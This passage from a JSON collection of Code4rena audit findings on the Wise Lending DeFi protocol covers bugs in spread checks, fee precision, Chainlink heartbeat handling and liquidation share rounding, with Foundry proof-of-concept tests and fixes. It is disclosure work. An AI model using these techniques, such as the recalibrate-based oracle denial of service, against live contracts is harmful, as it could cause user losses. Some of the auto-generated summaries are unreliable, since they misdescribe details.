      "tags": [],
      "finders": [
        "DanielArmstrong",
        "t0x1c"
      ]
    },
    {
      "id": "32105",
      "title": "[M-16] A user can lose more value than he specifies in the spread when he enters a `PowerFarm`",
      "impact": "MEDIUM",
      "content": "\nWhen a user enters or exits a `PowerFarm`, he specifies an allowed spread. The spread specifies the minimum value of the position allowed at the end of the transaction.\n\nE.g. a spread of 105% on a position with a value of `$1000` ensures the value does not fall below `$950`.\n\n`1000 * (200-105) / 100 = 950`\n\nWhen a user opens a position on Arbitrum, the `ENTRY_ASSET` is converted to WETH on UniswapV3. The second argument in line 434 specifies the minimum value for the swap. The spread is applied to this argument. Hence, the `_depositAmount` in line 432 cannot go less than what the spread allows.\n\n[PendlePowerFarmLeverageLogic.sol#L423-L440](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L423-L440)\n\n```solidity\n426:         uint256 reverseAllowedSpread = 2\n427:             * PRECISION_FACTOR_E18\n428:             - _allowedSpread;\n429: \n430:         if (block.chainid == ARB_CHAIN_ID) {\n431: \n432:             _depositAmount = _getTokensUniV3(\n433:                 _depositAmount,\n434:                 _getEthInTokens(\n435:                         ENTRY_ASSET,\n436:                         _depositAmount\n437:                     )\n438:                 * reverseAllowedSpread\n439:                 / PRECISION_FACTOR_E18,\n440:                 WETH_ADDRESS,\n441:                 ENTRY_ASSET\n442:             );\n443:         }\n```\n\nThe value at the end of the transaction is checked in line 508 below to ensure it does not go below the allowed spread. The `ethValueBefore` is calculated from `_depositAmount` in line 489. Note that if the swap on Uniswap occurred the `_depositAmount` may already be the minimum value. The `ethValueAfter` is scaled with the allowed spread in line `501`.\n\n[PendlePowerFarmLeverageLogic.sol#L485-L505](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L485-L505)\n\n```solidity\n489:         uint256 ethValueBefore = _getTokensInETH(\n490:             ENTRY_ASSET,\n491:             _depositAmount\n492:         );\n493: \n494:         (\n495:             uint256 receivedShares\n496:             ,\n497:         ) = IPendleChild(PENDLE_CHILD).depositExactAmount(\n498:             netLpOut\n499:         );\n500:         // @audit-issue the calculation for ethValueAfter below is incorrect\n501:         uint256 ethValueAfter = _getTokensInETH(\n502:             PENDLE_CHILD,\n503:             receivedShares\n504:         )\n505:             * _allowedSpread\n506:             / PRECISION_FACTOR_E18;\n507:         // @audit-issue ethValueBefore on Arbitrum uses the depositAmount that allowedSpread has already been applied\n508:         if (ethValueAfter < ethValueBefore) {\n509:             revert TooMuchValueLost();\n510:         }\n```\n\nThus the comparison in line 508 may compare `ethValueAfter` with the minimum value of the spread instead of the value of the initial deposit. With this implementation, if the spread for a `$1000` transaction is 105%, the minimum value after the transaction becomes `$902.5`.\n\n`(1000 * 95 / 100) * (95/100) = 902.5`. The user can lose `$47.5` (`950-902.5`).\n\nNote: In the implementation, the value at the end is scaled up instead of the value at the beginning being scaled down like the examples show. Hence, the actual minimum value is lesser i.e. `~$904.76` (`950/1.05`). This is a different bug.\n\n### Proof of Concept\n\n1. A user enters the market with `$1000` of WBTC and specifies a spread of 105%.\n2. At the end of the transaction the comparison is done against `$950`. So the actual value he gets can be between `~$904.76` and `$950` and the transaction would pass.\n3. The user may lose between `$0` and `$45.24` (`950 - 904.76`).\n\n### Recommended Mitigation Steps\n\nConsider storing the actual deposit and using it to calculate `ethValueBefore`.\n\n[PendlePowerFarmLeverageLogic.sol#L423-L488](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L423-L488)\n\n```solidity\n        uint256 reverseAllowedSpread = 2\n            * PRECISION_FACTOR_E18\n            - _allowedSpread;\n+       unit256 actualDeposit = _depositAmount;\n        if (block.chainid == ARB_CHAIN_ID) {\n\n            _depositAmount = _getTokensUniV3(\n                _depositAmount,\n                _getEthInTokens(\n                        ENTRY_ASSET,\n                        _depositAmount\n                    )\n                * reverseAllowedSpread\n                / PRECISION_FACTOR_E18,\n                WETH_ADDRESS,\n                ENTRY_ASSET\n            );\n        }\n\n    ...\n    \n        uint256 ethValueBefore = _getTokensInETH(\n            ENTRY_ASSET,\n-            _depositAmount\n+.           actualDeposit\n        );\n\n```\n\n### Assessed type\n\nUniswap\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/31#issuecomment-2082924786):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nBug Summary:\n\nThe `PendlePowerFarmLeverageLogic` contract has a bug that can cause users to lose money when entering or exiting a `PowerFarm` transaction. This is due to the minimum value check being done against the wrong value, which can result in a loss of up to $45.24 for a $1000 transaction. The recommended mitigation step is to store the actual deposit amount and use it to calculate the minimum value check. This bug has been assessed as an Uniswap type bug. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/31",
      "tags": [],
      "finders": [
        "nonseodion"
      ]
    },
    {
      "id": "32104",
      "title": "[M-15] Precision loss in the calculation of the fee amounts and fee shares inside the `_preparePool` function of the `MainHelper` contract",
      "impact": "MEDIUM",
      "content": "\nLow fee amounts and fee shares are calculated in the preparation part due to the precision loss.\n\n### Proof of Concept\n\nSolidity rounds down the result of an integer division, and because of that, it is always recommended to multiply before dividing to avoid that precision loss. In the case of a prior division over multiplication, the final result may face serious precision loss as the first answer would face truncated precision and then multiplied to another integer.\n\nThe problem arises in the pool's preparation part before applying the LASA algorithm. After cleaning up the pool, the next step is to update the pseudo amounts and adding the corresponding fee shares of that pool.\n\nIf we look deeply at the function `_updatePseudoTotalAmounts()` we can see the fee shares calculation procedure is presented as:\n\n```solidity\n        uint256 amountInterest = bareIncrease\n            / PRECISION_FACTOR_YEAR;\n\n        uint256 feeAmount = amountInterest\n            * globalPoolData[_poolToken].poolFee\n            / PRECISION_FACTOR_E18;\n```\n\nWe can see there is a hidden division before a multiplication that makes round down the whole expression. This is bad as the precision loss can be significant, which leads to the pool printing less `feeAmount` than actual.\n\nAlso, it is better to mention that some protocols implement this method to have an integer part of the division (usually in time-related situations). But we can clearly see that this pattern is used in the calculation of `feeAmount` at which the precision matters.\nFurthermore, the mentioned error will escalate, especially when the `bareIncrease` is bigger but close to the `PRECISION_FACTOR_YEAR` amount. The precision loss becomes more serious at lower discrepancies (such as `1.2 ~ 2` magnitudes of `PRECISION_FACTOR_YEAR`).\n\nAs for the Proof of Concept part, we can check this behavior precisely. You can run this code to see the difference between the results:\n\n```solidity\n    function test_precissionLoss() public {\n\n        uint x = (PRECISION_FACTOR_YEAR * 3)/ 2; // This number represents the `bareIncrease`\n        uint256 poolFee = 789600000000000000000000; // This number represents the `poolFee`\n\n        uint256 amountInterest = x\n            / PRECISION_FACTOR_YEAR;\n\n        uint256 feeAmount1 = amountInterest\n            * poolFee\n            / PRECISION_FACTOR_E18;\n\n        uint256 feeAmount2 = (x * poolFee) / (PRECISION_FACTOR_YEAR * PRECISION_FACTOR_E18);\n        \n        console.log(\"Current Implementation \", feeAmount1);\n        console.log(\"Actual Implementation \", feeAmount2);\n    }\n```\n\nThe result would be: (for 1.5 of `PRECISION_FACTOR_YEAR`):\n\n```\n         Current Implementation  789600\n         Actual Implementation  1184400\n```\n\nThus, we can see that the actual implementation produces less fee amount than the precise method. This test shows a big difference between the two calculated fee amounts in the LASA algorithm.\n\n### Tools Used\n\nForge\n\n### Recommended Mitigation Steps\n\nConsider modifying the fee shares calculation to prevent such precision loss and prioritize the multiplication over division:\n\n```solidity\n        uint256 amountInterest = bareIncrease\n            / PRECISION_FACTOR_YEAR;\n\n        uint256 feeAmount = bareIncrease\n            * globalPoolData[_poolToken].poolFee\n            / (PRECISION_FACTOR_E18 * PRECISION_FACTOR_YEAR);\n```\n\n### Assessed type\n\nMath\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/79#issuecomment-2082922984):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nThe bug report discusses a problem with how fee amounts and fee shares are calculated in a program called Forge. This is caused by a loss of precision in the code, which can result in the program printing less fee amount than it should. The report provides a proof of concept to demonstrate the issue and recommends a solution to modify the calculation to prevent this problem. The bug is classified as a math issue and has been mitigated in the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/79",
      "tags": [],
      "finders": [
        "Matin"
      ]
    },
    {
      "id": "32103",
      "title": "[M-14] Current heartbeat implementation may lead to a prolonged DoS for Chainlink Oracles",
      "impact": "MEDIUM",
      "content": "\nCurrently, if there are 50 fast updates followed by no updates, a Chainlink Oracle will be considered dead, even though it's normal behavior. Chainlink Oracles update either after some time has passed or upon a price change.\n\n### Vulnerability Details\n\n**How it will revert:**\n\nThere is a `_chainLinkIsDead` function that returns true if the last update took longer than the heartbeat. See [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/1240a22a3bbffc13d5f8ae6300ef45de5edc7c19/contracts/WiseOracleHub/OracleHelper.sol#L579-L585>).\n\n```solidity\nunchecked {\n\tupd = block.timestamp < upd\n\t\t? block.timestamp\n\t\t: block.timestamp - upd;\n\n\treturn upd > heartBeat[_tokenAddress];\n}\n```\n\nIt's essentially called on every request to the Chainlink Oracle, before the actual call, to ensure the price is up to date.\n\n**How does recalibrate work?**\n\n`heartBeat` is updated when `recalibrate`/`recalibrateBulk` is called. Anyone can call them. Both of these functions call `_recalibrate`. See [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/1240a22a3bbffc13d5f8ae6300ef45de5edc7c19/contracts/WiseOracleHub/OracleHelper.sol#L512-L514>).\n\n```solidity\n        heartBeat[_tokenAddress] = _recalibratePreview(\n            _tokenAddress\n        );\n```\n\nIn [`_recalibratePreview`](https://github.com/code-423n4/2024-02-wise-lending/blob/1240a22a3bbffc13d5f8ae6300ef45de5edc7c19/contracts/WiseOracleHub/OracleHelper.sol#L651), we see that `currentSecondBiggest` is returned, representing the second-largest difference between updates. Thus, `heartBeat` is set to the second-largest time difference between two consecutive updates in the last 50 updates. `iterationCount` is capped by `MAX_ROUND_COUNT` in `_getIterationCount`, which is set to 50.\n\n**[How do Chainlink updates work](https://docs.chain.link/architecture-overview/architecture-decentralized-model?parent=dataFeeds#aggregator)?**\n\n> Aggregators receive updates from the Oracle network only when the **Deviation Threshold** or **Heartbeat Threshold** triggers an update during an aggregation round. The first condition that is met triggers an update to the data.\n>\n> - Deviation Threshold: A new aggregation round starts when a node identifies that the off-chain values deviate by more than the defined deviation threshold from the onchain value. Individual nodes monitor one or more data providers for each feed.\n> - Heartbeat Threshold: A new aggregation round starts after a specified amount of time from the last update.\n\nIf you check \"Show more details\" [here](https://docs.chain.link/data-feeds/price-feeds/addresses?network=ethereum\\&page=1), you can see that for most feeds, deviation is set to 1-2% and heartbeat is `86400s = 24` hours. However, some feeds are set to 0.5% or even less.\n\nIf there's a period of high volatility followed by no volatility, it's possible that `heartBeat` in Wise will be set to a low value. Consequently, the Chainlink feed will be considered dead after a short period of no updates.\n\nE.g., if there are 50 updates, once every minute, followed by 10 hours of no updates, and then no updates for an additional 24 hours, the `heartBeat` will be set to 1 minute in Wise. Consequently, the Oracle will be considered dead after 1 minute of no updates. This means it will be considered dead for the initial 10 hours, then considered alive for 1 minute, and then considered dead again for the following 24 hours.\n\nExamples demonstrating similar events in the wild can be seen in [this Dune dashboard](<https://dune.com/00xsev/answer-updated-counters>).\n\n### Impact\n\nThe Chainlink Oracle is considered dead for a substantial amount of time, affecting liquidations, deposits, withdrawals, and all other functions using this Oracle.\n\nThe attacker can disable the entire market that uses the Oracle by calling recalibrate. This can lead to bad debt (the price changes rapidly, but the Oracle still reverts after the first update), griefing (users cannot use the protocol), etc.\n\nIt can be even worse if combined with block stuffing or when the gas price is too high and Chainlink does not update. The updates stop coming as often as usual, and the feed is considered dead long enough to accrue bad debt. For example, if the last 50 updates occurred every minute, a sudden spike in demand for block space could make updates come only once an hour, preventing liquidations for 1-2 hours.\n\n### Proof of Concept\n\n`forge test -f https://mainnet.infura.io/v3/YOUR_KEY -vvv --mt testOne --mc ChainlinkDies$`\n\n`contracts/Tests/ChainlinkDies.t.sol`\n\n<details>\n\n```solidity\npragma solidity =0.8.24;\n\nimport \"forge-std/console.sol\";\nimport \"forge-std/Test.sol\";\nimport \"../WiseOracleHub/OracleHelper.sol\";\n\n\ncontract OracleHelperMock is OracleHelper {\n    constructor(\n        address _wethAddress,\n        address _ethPriceFeed,\n        address _uniswapV3Factory\n    ) Declarations(_wethAddress, _ethPriceFeed, _uniswapV3Factory) {\n        \n    }\n\n    function addOracle(\n        address _tokenAddress,\n        IPriceFeed _priceFeedAddress,\n        address[] calldata _underlyingFeedTokens\n    ) external {\n        _addOracle(\n            _tokenAddress,\n            _priceFeedAddress,\n            _underlyingFeedTokens\n        );\n    }\n\n    function recalibrate(\n        address _tokenAddress\n    )\n        external\n    {\n        _recalibrate(_tokenAddress);\n    }\n\n    function chainLinkIsDead(\n        address _tokenAddress\n    )\n        external\n        view\n        returns (bool)\n    {\n       return _chainLinkIsDead(_tokenAddress);\n    }\n}\n\ninterface PartialAccessControlledOffchainAggregator is IPriceFeed {\n    function disableAccessCheck() external;\n    function owner() external returns (address);\n    function checkEnabled() external returns (bool);\n}\n\ncontract ChainlinkDies is Test {\n    address WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address ETH_PRICE_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;\n    address UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;\n\n    address FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;\n    PartialAccessControlledOffchainAggregator FEI_ETH_FEED = \n        PartialAccessControlledOffchainAggregator(0x4bE991B4d560BBa8308110Ed1E0D7F8dA60ACf6A);\n\n    uint LAST_NORMAL_BLOCK = 16_866_049;\n    // one block before the update after no updates for a day\n    uint TARGET_BLOCK = 16_872_122; \n\n    function testOne() external {\n        OracleHelperMock sut = _test(LAST_NORMAL_BLOCK);\n        assertFalse(sut.chainLinkIsDead(FEI));\n\n        sut = _test(TARGET_BLOCK);\n        assert(sut.chainLinkIsDead(FEI));\n    }\n\n    function _test(uint blockNumber) internal returns (OracleHelperMock) {\n        vm.rollFork(blockNumber);\n\n        vm.prank(FEI_ETH_FEED.owner());\n        FEI_ETH_FEED.disableAccessCheck();\n        assertFalse(FEI_ETH_FEED.checkEnabled());\n\n        OracleHelperMock sut = new OracleHelperMock(WETH_ADDRESS, ETH_PRICE_FEED, UNISWAP_V3_FACTORY);\n        // make sure recalibrate works\n        sut.addOracle( {\n            _tokenAddress: FEI,\n            _priceFeedAddress: FEI_ETH_FEED,\n            _underlyingFeedTokens: new address[](0)\n        } );\n        sut.recalibrate(FEI);\n        console.log(\"block:\", blockNumber);\n        console.log(\"chainLinkIsDead:\", sut.chainLinkIsDead(FEI));\n\n        return sut;\n    }\n\n\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nConsider setting Chainlink's native heartbeat instead. Also consider adding access control to `recalibrate` functions and only calling it when it will not lead to DoS.\n\n### Assessed type\n\nOracle\n\n**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87#issuecomment-2009125717):**\n > It takes second highest out of last 50 rounds if you recalibrate. If it takes forever to update for chainlink it means there is no volatility. So dismissed.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87#issuecomment-2020987565):**\n > Warden discussed a potential scenario when the Oracle would be considered dead after just one minute of inactivity. \n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87#issuecomment-2032193902):**\n > @Trust - it depends on the expected heartbeat, if it's one minute, and latest data does not come within that frame then Oracle SHOULD be considered dead.\n> \n> Example: `recalibrate()` looks for second longest time gap between latest 50 (or 500 depending on chain) rounds, by analyzing timegaps between reported prices in last 50/500 rounds contract chooses appropriate expected timeframe when Oracle needs to answer before considered dead. If the time frame is too short this is only because that what was picked up from latest round data and should be honored (unlike this finding).\n> \n> Note that it can be recalibrated to increase the expected time if needed.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87#issuecomment-2082921804):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nBug report summary: The current system for determining if a Chainlink Oracle is dead is flawed and can lead to incorrect assumptions. This can result in issues with liquidations, deposits, and withdrawals. The system can also be manipulated by an attacker to disable the market. It is recommended to consider changing the system to use Chainlink's native heartbeat and adding access control to prevent potential attacks. The bug has been mitigated by the Wise Lending team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87",
      "tags": [],
      "finders": [
        "00xSEV"
      ]
    },
    {
      "id": "32102",
      "title": "[M-13] Incorrect calculation of lending shares in `_withdrawOrAllocateSharesLiquidation` can lead to revert and failure to liquidate",
      "impact": "MEDIUM",
      "content": "\nWhen liquidating a user, `_withdrawOrAllocateSharesLiquidation()` can be called which checks if a pool is large enough to pay out the liquidator, and if not, then the liquidator is allocated shares that can be used to withdraw at a later time when the pool is large enough. There are two scenarios in which the pool will not be large enough to pay out the liquidator:\n\n1. The obvious scenario where the pool simply doesn't contain enough tokens to cover the withdraw amount.\n2. So many tokens are borrowed out of the pool that there isn't enough available to pay out the liquidator.\n\nNote: If there are some tokens available but not enough to cover the entire withdraw amount, then those tokens are transferred, dropping the total pool to `0`, and the rest are allocated as shares.\n\nHowever, if these scenarios were ever to arise, the `_withdrawOrAllocateSharesLiquidation()` function would not work as expected. This is due to how it calculates the lending shares (`totalPoolInShares`) of the total pool:\n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L493>\n\nWhen liquidating, it will calculate the `totalPoolInShares` like this (with amount being the total pool):\n\n```\n       lendingShares = (totalDepositShares * amount) / pseudoTotalPool - 1;\n```\n\nHowever, calculating the lending shares this way will cause the `_compareSharePrices()` to revert on the `syncPool` modifier. Specifically the check on\n\n        _validateParameter(\n            _lendSharePriceBefore,\n            lendSharePriceAfter\n        );\n\nThis is because `_maxSharePrice` is passed in as false to `calculateLendingShares()`, which subtracts one.\n\n```\n    uint256 totalPoolInShares = calculateLendingShares(\n                {\n                    _poolToken: _poolToken,\n                    _amount: totalPoolToken,\n                    _maxSharePrice: false\n                }\n            );\n```\n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L497>\n\nHowever, because we are withdrawing, it should be set to true so that it adds one. In all other areas where `calculateLendingShares()` is being used, the functions that focus on withdrawing have `_maxSharePrice: true` and the depositing functions have `_maxSharePrice: false`:\n\n[`withdrawOnBehalfExactAmount` on `WiseLending.sol`](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L874>).\n\n[`_preparationsWithdraw` on `MainHelper.sol`](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/MainHelper.sol#L154>).\n\n[`_handleDeposit` on `WiseCore.sol`](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L119>).\n\nWhen `_maxSharePrice` is set to true, the `_validateParameter()` check will pass.\n\nEven if the `_validateParameter()` check did not exist, if `_maxSharePrice` is left as-is (set to false), any subsequent liquidations through `_withdrawOrAllocateSharesLiquidation()` would revert with panic due to an underflow. This is because (as stated above), liquidating when the pool is not large enough to pay out the liquidator will drop the total pool to `0` and issue the remainder as shares. Therefore, any subsequent calls to liquidate when the total pool is `0` will underflow:\n\n```\n        //amount is totalPoolToken which in this scenario = 0;\n        shares = amount * totalDepositShares / pseudoTotalPool - 1\n```\n\n### Impact\n\nWhen a particular receiving token is desired and `_withdrawOrAllocateSharesLiquidation()` is called, the liquidation will always revert if the total pool is not large enough to cover the withdraw amount. This defeats the purpose of `_withdrawOrAllocateSharesLiquidation()`, as stated in the NatSpec:\n\n```\n    /**\n         * @dev Internal math function for liquidation logic\n         * which checks if pool has enough token to pay out\n         * liquidator. If not, liquidator get corresponding\n         * shares for later withdraw.\n         */\n```\n\nThis will lead to frustrated users who desire a particular receiving token. The level of frustration will be even higher if the reason this function reverts is because the total pool is borrowed out. This would lead to a very high APY, thus a much higher desire to receive the particular token. Additionally, the borrowers in these particular situations will not be liquidated even though they should be. Ultimately, this will lead to loss of faith in the protocol.\n\nHowever, this can be easily avoided by just passing in a different receiving token that is large enough to payout the withdraw amount, which is why this is a medium level issue.\n\n### Proof of Concept\n\nCopy and paste this foundry test into the `/contracts` folder and run `forge test --fork-url mainnet --match-path ./contracts/WoolCentaurLiquidationTest.t.sol --match-test testLiquidateMockPool  -vvvv`.  As the code is, the test will fail.  To have it pass, change the bool [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L497>)\nto `true`.\n\n<details>\n\n```\n    // SPDX-License-Identifier: -- WISE --\n\n    pragma solidity =0.8.24;\n\n\n    import \"forge-std/Test.sol\";\n    import \"forge-std/StdUtils.sol\";\n    import \"./InterfaceHub/IBalancerFlashloan.sol\";\n    import \"./InterfaceHub/IWiseLending.sol\";\n    import \"./InterfaceHub/ICurve.sol\";\n    import \"./InterfaceHub/IAaveHub.sol\";\n    import \"./InterfaceHub/IAave.sol\";\n    import \"./InterfaceHub/IPositionNFTs.sol\";\n    import \"./WiseLendingBaseDeployment.t.sol\";\n    import \"./PoolManager.sol\";\n\n\n\n    contract WoolCentaur is BaseDeploymentTest {\n\n            function testLiquidateMockPool() public {\n                /////////////////////////////\n                // Setup new fork and deal tokens\n                _useBlock(\n                    NEW_BLOCK\n                );\n\n                _deployNewWiseLending(\n                    {\n                        _mainnetFork: false\n                    }\n                );\n\n                vm.deal(address(1), 2000 ether);\n                vm.deal(WISE_DEPLOYER, 1000 ether);\n                address paybackToken = address(MOCK_AAVE_ATOKEN_3);\n                address receivingToken = address(MOCK_AAVE_ATOKEN_4);\n                address mockWETH = address(MOCK_WETH);\n                deal(paybackToken, WISE_DEPLOYER, 11000e6);\n                deal(receivingToken, address(1), 200000e6);\n                deal(mockWETH, WISE_DEPLOYER, 1000e18);\n                deal(mockWETH, address(1), 1000e18);\n\n                //Mint position nfts to address 1\n                _startPrank(\n                    address(1)\n                );\n\n                POSITION_NFTS_INSTANCE.mintPosition();\n\n                uint256[] memory nftsOfOwner1 = POSITION_NFTS_INSTANCE.walletOfOwner(\n                    address(1)\n                );\n\n                uint256 nftIdFirst = nftsOfOwner1[0];\n\n                _stopPrank();\n\n                // Mint position nfts to WISE_DEPLOYER\n                _startPrank(\n                    WISE_DEPLOYER\n                );\n                POSITION_NFTS_INSTANCE.mintPosition();\n\n                uint256[] memory nftsOfOwner2 = POSITION_NFTS_INSTANCE.walletOfOwner(\n                    WISE_DEPLOYER\n                );\n\n                uint256 nftIdSecond = nftsOfOwner2[0];\n                \n                skip(10);\n\n                //Approve and deposit the payback tokens\n                IERC20(paybackToken).approve(\n                    address(LENDING_INSTANCE),\n                    10000e6\n                );\n\n                LENDING_INSTANCE.depositExactAmount(\n                    nftIdSecond,\n                    paybackToken,\n                    10000e6\n                );\n\n                //Approve and deposit the collateral tokens\n                IERC20(mockWETH).approve(\n                    address(LENDING_INSTANCE),\n                    1000e18\n                );\n\n                LENDING_INSTANCE.depositExactAmount(\n                    nftIdSecond,\n                    mockWETH,\n                    1000e18\n                );\n\n                _stopPrank();\n\n        \n                _startPrank(\n                    address(1)\n                );\n                //Deposit collateral tokens\n                LENDING_INSTANCE.depositExactAmountETH{\n                    value: 2000 ether\n                }(nftIdFirst);\n\n                //Set the value of the receiving token\n                MOCK_CHAINLINK_4.setValue(\n                    0.00000000000000001 ether\n                );\n                //Approve and deposit the receiving token\n                IERC20(receivingToken).approve(\n                    address(LENDING_INSTANCE),\n                    20000e6\n                );\n\n                LENDING_INSTANCE.depositExactAmount(\n                    nftIdFirst,\n                    receivingToken,\n                    20000e6\n                );\n                //Set the value of the payback token\n                MOCK_CHAINLINK_3.setValue(\n                    0.00000000000000001 ether\n                );\n                //Liquidatee borrows 100% the payback token\n                LENDING_INSTANCE.borrowExactAmount(\n                    nftIdFirst,\n                    paybackToken,\n                    10000e6\n                );\n                //Set the new value of payback token, pushing it into bad debt so it can be liquidated\n                MOCK_CHAINLINK_3.setValue(\n                    0.00000001 ether\n                );\n\n                _stopPrank();\n\n\n                _startPrank(\n                    WISE_DEPLOYER\n                );\n                //Liquidator borrows 100% of the receivingToken so shares must be issued\n                LENDING_INSTANCE.borrowExactAmount(\n                    nftIdSecond,\n                    receivingToken,\n                    20000e6\n                );\n\n\n                skip(6000);\n                (, uint256 liquidateeLendingSharesBefore) = LENDING_INSTANCE.userLendingData(nftIdFirst, (receivingToken));\n                (, uint256 liquidatorLendingSharesBefore) = LENDING_INSTANCE.userLendingData(nftIdSecond, (receivingToken));\n                //assert that the liquidator starts with 0 shares\n                assertEq(liquidatorLendingSharesBefore, 0);\n                emit log_named_uint(\"shares of liquidatee before\", liquidateeLendingSharesBefore);\n                emit log_named_uint(\"shares of liquidator before\", liquidatorLendingSharesBefore);\n                //Approve and liquidate the respective shares and tokens\n                IERC20(paybackToken).approve(\n                    address(LENDING_INSTANCE),\n                    11\n                );\n\n                LENDING_INSTANCE.liquidatePartiallyFromTokens(\n                    nftIdFirst,\n                    nftIdSecond,\n                    paybackToken,\n                    receivingToken,\n                    10\n                );\n                _stopPrank();\n\n                (, uint256 liquidateeLendingSharesAfter) = LENDING_INSTANCE.userLendingData(nftIdFirst, (receivingToken));\n                (, uint256 liquidatorLendingSharesAfter) = LENDING_INSTANCE.userLendingData(nftIdSecond, (receivingToken));\n                //asserts that the liquidator shares have increased\n                assertNotEq(liquidatorLendingSharesAfter, 0);\n                emit log_named_uint(\"shares of liquidatee after\", liquidateeLendingSharesAfter);\n                emit log_named_uint(\"shares of liquidator after\", liquidatorLendingSharesAfter);\n                //asserts that the liquidatee + the liquidator = the total shares\n                assertEq(liquidateeLendingSharesAfter + liquidatorLendingSharesAfter, 19999999998);\n            }\n    }\n```\n\n</details>\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nChange the `_maxSharePrice` under `calculateLendingShares` on `_withdrawOrAllocateSharesLiquidation()` to true.\n\n### Assessed type\n\nError\n\n**[vm06007 (Wise Lending) commented via duplicate issue #238](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/238#issuecomment-2002357694):**\n> That seems to be like a desired functionality by design and expected behavior. @vonMangoldt can confirm.\n\n**[vonMangoldt (Wise Lending) commented via duplicate issue #238](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/238#issuecomment-2003980386):**\n> This looks right from my first looking into it. Just curious why it didn't DOS in our javascript tests. Probably the percentage roundings (etc.) need to be aligned for that behaviour.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/116#issuecomment-2020926895):**\n > Selected as best because of good POC + well balanced severity rationalization.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/116#issuecomment-2082920876):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the `_withdrawOrAllocateSharesLiquidation()` function in the Wise Lending protocol. This function is responsible for liquidating a user's position and allocating shares if the pool does not have enough tokens to pay out the liquidator. However, there are two scenarios in which the function does not work as intended. Firstly, if the pool does not have enough tokens to cover the withdraw amount, and secondly, if too many tokens have been borrowed from the pool. This is because of the way the function calculates the total pool in shares. Due to this, the function may revert and cause frustration for users who want to receive a specific token. The issue can be easily avoided by changing a parameter in the function, and it has been mitigated by the Wise Lending team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/116",
      "tags": [],
      "finders": [
        "SBSecurity",
        "WoolCentaur",
        "AM"
      ]
    },
    {
      "id": "32101",
      "title": "[M-12] `PendlePowerFarmToken:: totalLpAssetsToDistribute` may lead to temporary DOS due to price growth check being skipped during deposit",
      "impact": "MEDIUM",
